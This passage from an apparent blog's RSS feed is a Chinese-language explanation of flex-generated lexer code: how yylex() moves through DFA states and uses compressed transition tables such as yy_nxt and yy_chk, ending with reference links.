&#123;</span><br><span class="line">                (yy_last_accepting_state) = yy_current_state;</span><br><span class="line">                (yy_last_accepting_cpos) = yy_cp;</span><br><span class="line">                &#125;</span><br><span class="line">            ++yy_cp;</span><br><span class="line"> &#125;</span><br><span class="line">        yy_current_state = -yy_current_state;</span><br><span class="line"> </span><br><span class="line">yy_find_action:</span><br><span class="line">        <span class="comment">// 状态转移完了，查看转移后的状态是否出于可接受状态</span></span><br><span class="line">        yy_act = yy_accept[yy_current_state];</span><br><span class="line"> </span><br><span class="line">        YY_DO_BEFORE_ACTION;</span><br><span class="line"> </span><br><span class="line">do_action:    <span class="comment">/* 这里主要是处理读取到EOF的情况. */</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">switch</span> ( yy_act )    &#123; <span class="comment">/* beginning of action switch */</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="comment">// yy_accept中值为1为接受状态，其他状态不合法 </span></span><br><span class="line">        &#123;<span class="keyword">return</span> <span class="literal">true</span> ;&#125;</span><br><span class="line">        YY_BREAK</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">case</span> <span class="title">YY_STATE_EOF</span><span class="params">(INITIAL)</span>:</span></span><br><span class="line"><span class="function">        <span class="title">yyterminate</span><span class="params">()</span></span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">case</span> YY_END_OF_BUFFER:</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="comment">/* Amount of text matched not including the EOB char. */</span></span><br><span class="line">        <span class="keyword">int</span> yy_amount_of_matched_text = (<span class="keyword">int</span>) (yy_cp - (yytext_ptr)) - <span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 还原YY_DO_BEFORE_ACTION做出的变动</span></span><br><span class="line">        *yy_cp = (yy_hold_char);</span><br><span class="line">        YY_RESTORE_YY_MORE_OFFSET</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 调整buffer，其中有对EOB的不同情况的处理等等</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        YY_FATAL_ERROR(<span class="string">&quot;fatal flex scanner internal error--no action found&quot;</span> );</span><br><span class="line">        &#125; <span class="comment">/* end of action switch */</span></span><br><span class="line">    &#125; <span class="comment">/* end of scanning one token */</span></span><br><span class="line">    &#125; <span class="comment">/* end of user&#x27;s declarations */</span></span><br><span class="line">&#125; <span class="comment">/* end of yylex */</span></span><br></pre></td></tr></table></figure><p>我们从中可以看出，<strong>1</strong> 是我们起始状态的起点,在进行正则匹配的时候，我们从这个状态开始不断的读入字符，不断的进行状态转移，最终会停在某个节点。此时我们就会判断当前状态对应的数值,如果是 <strong>1</strong> 则表示 accept 状态，如果不是则为非法的，这里面的两个 <code>1</code> <strong>含义完全不同</strong>：前者是状态的标识，后者则是标志某个状态是否是接受状态。</p><p>上面的 DFA 伪代码可以抽象成</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">state= <span class="number">0</span>; </span><br><span class="line">get next input character</span><br><span class="line"><span class="keyword">while</span> (<span class="keyword">not</span> end of input) &#123;</span><br><span class="line">    depending on current state <span class="keyword">and</span> input character</span><br><span class="line">        match: <span class="comment">/* input expected */</span></span><br><span class="line">            calculate <span class="keyword">new</span> state; get next input character</span><br><span class="line">        accept: <span class="comment">/* current pattern completely matched */</span></span><br><span class="line">            state= <span class="number">0</span>; perform action corresponding to pattern</span><br><span class="line">        error: <span class="comment">/* input unexpected */</span></span><br><span class="line">            state= <span class="number">0</span>; echo <span class="number">1</span>st character input after last accept <span class="keyword">or</span> error;</span><br><span class="line">            reset input to <span class="number">2</span>nd character input after last accept <span class="keyword">or</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结就是从开始状态开始，读取字符并结合状态跳转表来进行状态跳转，当无法继续跳转的时候或字符已经读取完成,此时判断是否是 accept 的状态，并执行用户定义的规则代码。</p><h3 id="压缩状态矩阵"><a href="#压缩状态矩阵" class="headerlink" title="压缩状态矩阵"></a>压缩状态矩阵</h3><p>状态跳转表以及accept表如下</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">yyconst <span class="keyword">flex_int16_t</span> yy_accept[<span class="number">10</span>]</span><br><span class="line">yyconst YY_CHAR yy_ec[<span class="number">256</span>]</span><br><span class="line">yyconst YY_CHAR yy_meta[<span class="number">7</span>]</span><br><span class="line">yyconst <span class="keyword">flex_uint16_t</span> yy_base[<span class="number">12</span>]</span><br><span class="line">yyconst <span class="keyword">flex_int16_t</span> yy_def[<span class="number">12</span>]</span><br><span class="line">yyconst <span class="keyword">flex_uint16_t</span> yy_nxt[<span class="number">19</span>]</span><br><span class="line">yyconst <span class="keyword">flex_int16_t</span> yy_chk[<span class="number">19</span>]</span><br></pre></td></tr></table></figure><p>而此时 match 中的代码就会变为</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">yy_current_state = (yy_start);</span><br><span class="line">yy_match:</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">register</span> YY_CHAR yy_c = yy_ec[YY_SC_TO_UI(*yy_cp)] ;</span><br><span class="line">    <span class="comment">// 这个if语句就不影响状态转移，只是为了记录状态</span></span><br><span class="line">    <span class="keyword">if</span> ( yy_accept[yy_current_state] )</span><br><span class="line">        &#123;</span><br><span class="line">        (yy_last_accepting_state) = yy_current_state;</span><br><span class="line">        (yy_last_accepting_cpos) = yy_cp;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">while</span> ( yy_chk[yy_base[yy_current_state] + yy_c] != yy_current_state )</span><br><span class="line">        &#123;</span><br><span class="line">        yy_current_state = (<span class="keyword">int</span>) yy_def[yy_current_state];</span><br><span class="line">        <span class="comment">// 注意这个22是Magic Number，随accept数量变化</span></span><br><span class="line">        <span class="keyword">if</span> ( yy_current_state &gt;= <span class="number">22</span> )</span><br><span class="line">            yy_c = yy_meta[(<span class="keyword">unsigned</span> <span class="keyword">int</span>) yy_c];</span><br><span class="line">        &#125;</span><br><span class="line">    yy_current_state = yy_nxt[yy_base[yy_current_state] + (<span class="keyword">unsigned</span> <span class="keyword">int</span>) yy_c];</span><br><span class="line">    ++yy_cp;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 这个43也是Magic Number</span></span><br><span class="line"><span class="keyword">while</span> ( yy_base[yy_current_state] != <span class="number">43</span> );</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>从生成代码中我们<strong>最需要知道</strong>的就是：DFA 的状态转移图(以矩阵的形式体现出来),以及理解如何使用状态转移图的,也就是理解 <code>yylex()</code> 函数的具体实现,它其中定义了各个状态的含义。那么从代码中我们也能知道<code>yy_nxt[yy_current_state][ YY_SC_TO_UI(*yy_cp) ]</code>中 yy_nxt 就是我们的状态跳转表，YY_SC_TO_UI 能够将我们的字符转成相应的 ascii，yy_cp 指针指向我们要读取的字符。这样我们的矩阵抽象出来就是我们的每一行代表的是我们的状态，每一列代表的是我们的字符转成ascii后的无符号整数。<strong>一句话概括就是现实生活中的查表</strong>。</p><p>例如一个规则表达式 <code>a(b|c)d*e+</code>，其状态可由下图表示</p><p><img src="https://i.loli.net/2020/06/25/4iISH2a3tJGZToc.png" alt="image-20200625220424190.png"></p><p>会产生如下状态表</p><p><img src="https://i.loli.net/2020/06/25/ysTpxdPSIjnKCoB.png" alt="image-20200625220612068.png"></p><ul><li><p>a 表示 accept 状态</p></li><li><p>m(N) 表示跳转到 N 状态</p></li><li><p>空白处则为 error</p></li></ul><p>基本上 flex 生成的代码还是通过匹配循环来实现<code>规则-&gt;行为</code>的模式，不断的调用 yylex 来匹配输出相应的 token。</p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://tina2114.github.io/2020/06/16/lexer代码骨架整理/#more">https://tina2114.github.io/2020/06/16/lexer%E4%BB%A3%E7%A0%81%E9%AA%A8%E6%9E%B6%E6%95%B4%E7%90%86/#more</a></p><p><a href="https://chenyuzhuwhiskey.github.io/2020/06/21/flex-lexer分析/">https://chenyuzhuwhiskey.github.io/2020/06/21/flex-lexer%E5%88%86%E6%9E%90/</a></p><p><a href="https://happyers.top/uncategorized/understanding-c-lexer-generated-by-flex/#toc-head-1">https://happyers.top/uncategorized/understanding-c-lexer-generated-by-flex/#toc-head-1</a></p><p><a href="https://blog.finaltheory.me/research/Flex-Tricks.html#b129e">https://blog.finaltheory.me/research/Flex-Tricks.html#b129e</a></p>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/01/22/lexical%20scanner%20generated%20by%20flex/#disqus_thread</comments>
    </item>
    
  </channel>
</rss>
